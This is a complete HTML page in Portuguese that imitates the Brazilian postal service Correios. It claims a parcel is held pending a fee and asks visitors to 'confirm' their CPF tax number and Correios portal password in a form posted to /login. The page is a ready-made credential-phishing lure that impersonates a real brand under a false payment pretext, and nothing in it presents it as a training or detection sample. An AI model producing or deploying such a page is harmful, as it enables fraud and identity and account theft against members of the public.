<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Rastreamento Correios</title>
<style>
    body { font-family: Arial, sans-serif; background: #ffe600; color: #00416b; text-align: center; padding: 50px; }
    .box { background: white; padding: 20px; max-width: 400px; margin: auto; border-radius: 10px; }
    h1 { color: #00416b; }
    input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
    button { background: #00416b; color: white; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }
</style>
</head>
<body>
    <div class="box">
        <h1>Correios</h1>
        <p>Objeto aguardando pagamento de taxa.</p>
        <p>Para visualizar o boleto, confirme seus dados.</p>
        <form action="/login" method="POST">
            <input type="text" name="cpf" placeholder="CPF">
            <input type="password" name="password" placeholder="Senha do Portal Correios">
            <button type="submit">Visualizar</button>
        </form>
    </div>
</body>
</html>
